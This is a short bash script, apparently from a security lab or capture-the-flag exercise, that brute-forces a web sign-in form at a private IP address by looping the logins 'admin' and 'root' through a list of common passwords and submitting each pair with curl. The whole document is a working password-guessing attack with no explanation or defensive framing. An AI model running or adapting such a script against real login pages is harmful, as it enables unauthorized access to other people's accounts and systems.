commonPasswd=('123456', '123456789', 'qwerty', 'password', '1234567890', '111111', '987654321', 'qwertyuiop', 'mynoob', '123321', '654321', '1q2w3e4r');
commonLogin=('admin', 'root');

for login in "${commonLogin[@]}"
do
	for passwd in "${commonPasswd[@]}"
	do
		curl "http://10.11.200.246/?page=signin&username=$login&password=$passwd&Login=Login#"
	done
done
